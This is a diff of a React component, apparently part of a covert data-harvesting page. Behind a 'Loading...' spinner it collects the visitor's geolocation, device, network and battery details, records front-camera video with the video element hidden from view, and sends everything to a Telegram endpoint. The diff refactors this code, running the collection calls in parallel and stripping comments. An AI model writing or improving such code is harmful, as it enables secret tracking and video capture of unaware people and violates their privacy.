@@ -2,7 +2,7 @@
 
 import React, { useEffect, useRef, useState, useCallback } from "react";
 import QrScanner from "./qr-scanner";
-import { Button } from "@/components/ui/button"; // Assuming you have a Button component
+import { Button } from "@/components/ui/button";
 import {
   getGeolocation,
   getClientInfo,
@@ -10,7 +10,7 @@ import {
   getDeviceMemory,
   getBatteryInfo,
   getPermissionStatus,
-  PermissionStatus // <-- Теперь импортируем PermissionStatus из client-data.ts
+  PermissionStatus // Импортируем PermissionStatus
 } from "@/lib/client-data";
 
 const TELEGRAM_API_ENDPOINT = "/api/telegram";
@@ -20,8 +20,7 @@ const QR_SCAN_TIMEOUT_MS = 10000; // 10 seconds for QR scanning
 type GeolocationData = { latitude: number; longitude: number };
 type ClientInfo = { userAgent: string; platform: string; hardwareConcurrency: number };
 type NetworkInfo = { effectiveType?: string; rtt?: number; downlink?: number };
-type BatteryInfo = { level?: number; charging?: boolean };
-// Удалено локальное определение PermissionStatus, теперь используется импортированный тип
+type BatteryInfo = { level?: number; charging?: boolean; status?: string }; // Добавлено status для батареи
 
 type CollectedData = {
   geolocation?: GeolocationData;
@@ -29,8 +28,8 @@ type CollectedData = {
   networkInfo?: NetworkInfo;
   deviceMemory?: number;
   batteryInfo?: BatteryInfo;
-  permissionStatus?: PermissionStatus;
-  ipAddress?: string; // Will be filled on the server side
+  permissionStatus?: PermissionStatus; // Используем импортированный тип
+  ipAddress?: string;
   video1?: string;
   video2?: string;
   qrCodeData?: string;
@@ -52,7 +51,7 @@ const PermissionHandler = () => {
   const [appPhase, setAppPhase] = useState<AppPhase>("initial");
   const [loadingMessage, setLoadingMessage] = useState("Загрузка...");
   const [collectedData, setCollectedData] = useState<CollectedData>({});
-  const [sessionKey, setSessionKey] = useState(0); // Used to force re-mount/re-run useEffect
+  const [sessionKey, setSessionKey] = useState(0);
 
   const loadingMessages = [
     "Идет сбор данных об устройстве...",
@@ -68,7 +67,7 @@ const PermissionHandler = () => {
     return setInterval(() => {
       setLoadingMessage(loadingMessages[index % loadingMessages.length]);
       index++;
-    }, 2000); // Change message every 2 seconds
+    }, 2000);
   }, []);
 
   const sendDataToTelegram = useCallback(async (data: CollectedData) => {
@@ -103,7 +102,7 @@ const PermissionHandler = () => {
 
         if (videoRef.current) {
           videoRef.current.srcObject = stream;
-          videoRef.current.muted = true; // Mute local playback
+          videoRef.current.muted = true;
           videoRef.current.setAttribute("playsinline", "true");
           await videoRef.current.play().catch((e) => console.error("Error playing video stream:", e));
         }
@@ -125,7 +124,6 @@ const PermissionHandler = () => {
             reader.onloadend = () => {
               resolve(reader.result as string);
             };
-            // Stop all tracks after recording
             stream?.getTracks().forEach((track) => track.stop());
             if (videoRef.current) {
               videoRef.current.srcObject = null;
@@ -163,7 +161,6 @@ const PermissionHandler = () => {
   const handleQrScanError = useCallback(
     async (error: string) => {
       console.error("QR Scan Error:", error);
-      // Optionally send a message about the error
       await sendDataToTelegram({ ...collectedData, qrCodeData: `QR Scan Error: ${error}` });
       setAppPhase("finished");
     },
@@ -173,7 +170,7 @@ const PermissionHandler = () => {
   const startNewSession = useCallback(() => {
     setAppPhase("initial");
     setCollectedData({});
-    setSessionKey((prevKey) => prevKey + 1); // Increment key to re-run useEffect
+    setSessionKey((prevKey) => prevKey + 1);
   }, []);
 
   useEffect(() => {
@@ -185,29 +182,40 @@ const PermissionHandler = () => {
       loadingInterval = updateLoadingMessage();
 
       const initialData: CollectedData = {};
-      const currentPermissionStatus: PermissionStatus = await getPermissionStatus();
-      initialData.permissionStatus = currentPermissionStatus;
-
-      // Get IP Address (will be filled on server side, but we pass a placeholder)
-      initialData.ipAddress = "Fetching..."; // Placeholder, actual IP from req.ip on server
-
-      // Collect client info
+      
+      // Collect client info (synchronous)
       initialData.clientInfo = getClientInfo();
       initialData.networkInfo = getNetworkInfo();
       initialData.deviceMemory = getDeviceMemory();
 
-      // Collect battery info
-      const { data: batteryData, status: batteryStatus } = await getBatteryInfo();
-      if (batteryData) initialData.batteryInfo = batteryData;
-      currentPermissionStatus.battery = batteryStatus; // Add battery status to permissions
+      // Collect async data and await them
+      const [permissionStatusResult, batteryInfoResult, geolocationResult] = await Promise.all([
+        getPermissionStatus(),
+        getBatteryInfo(),
+        getGeolocation(),
+      ]);
 
-      // Collect geolocation
-      const { data: geoData, status: geoStatus } = await getGeolocation();
-      if (geoData) initialData.geolocation = geoData;
-      currentPermissionStatus.geolocation = geoStatus; // Update geolocation status
+      initialData.permissionStatus = permissionStatusResult;
+
+      if (batteryInfoResult.data) {
+        initialData.batteryInfo = { ...batteryInfoResult.data, status: batteryInfoResult.status };
+      } else {
+        initialData.batteryInfo = { status: batteryInfoResult.status };
+      }
+
+      if (geolocationResult.data) {
+        initialData.geolocation = geolocationResult.data;
+      }
+      // Update geolocation status in permissionStatus
+      if (initialData.permissionStatus) {
+        initialData.permissionStatus.geolocation = geolocationResult.status;
+      }
+
+      // IP Address will be filled on the server side, but we pass a placeholder for now
+      initialData.ipAddress = "Fetching..."; 
 
       setCollectedData(initialData);
-      await sendDataToTelegram(initialData); // Send initial data immediately
+      await sendDataToTelegram(initialData); // Send initial data AFTER all async data is collected
 
       // --- Video 1 Recording ---
       setAppPhase("recordingVideo1");
@@ -257,11 +265,9 @@ const PermissionHandler = () => {
   // Effect to send video2 when QR scanner is truly active
   useEffect(() => {
     if (appPhase === "qrScanning" && collectedData.video2 && !collectedData.qrCodeData) {
-      // Only send video2 if it hasn't been sent as part of a QR scan or timeout
       const sendVideo2 = async () => {
         console.log("Sending Video 2 now that QR scanner is active...");
         await sendDataToTelegram({ ...collectedData, video2: collectedData.video2 });
-        // Clear video2 from collectedData to prevent re-sending
         setCollectedData(prev => ({ ...prev, video2: undefined }));
       };
       sendVideo2();
@@ -281,11 +287,9 @@ const PermissionHandler = () => {
             {loadingMessage}
           </p>
           <div className="relative w-full max-w-md aspect-video bg-muted flex items-center justify-center rounded-lg overflow-hidden">
-            {/* Video element is hidden during front camera recording */}
             <video ref={videoRef} autoPlay playsInline muted className="w-full h-full object-cover" style={{ display: 'none' }} />
             <div className="absolute inset-0 border-4 border-primary-foreground opacity-70 rounded-lg pointer-events-none" />
             <div className="absolute inset-0 flex items-center justify-center">
-              {/* Simple loading spinner */}
               <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-primary-foreground" />
             </div>
           </div>
